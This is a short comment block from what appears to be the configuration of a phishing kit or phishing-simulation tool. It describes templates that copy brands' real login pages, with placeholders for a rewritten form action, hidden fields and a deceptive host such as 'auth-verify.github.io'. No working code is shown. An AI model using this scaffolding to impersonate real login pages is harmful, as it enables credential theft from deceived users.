# Brand template metadata.
#
# Each entry maps to an HTML file in templates/brands/.
# The HTML file should contain the real login page with these placeholders:
#
#   {{FORM_ACTION}}     — replaced with the form submission URL
#   {{HIDDEN_FIELDS}}   — replaced with hidden <input> elements
#   {{PLATFORM_URL}}    — replaced with the hosting platform URL (e.g. "auth-verify.github.io")
#
# See templates/brands/README.md for detailed instructions.

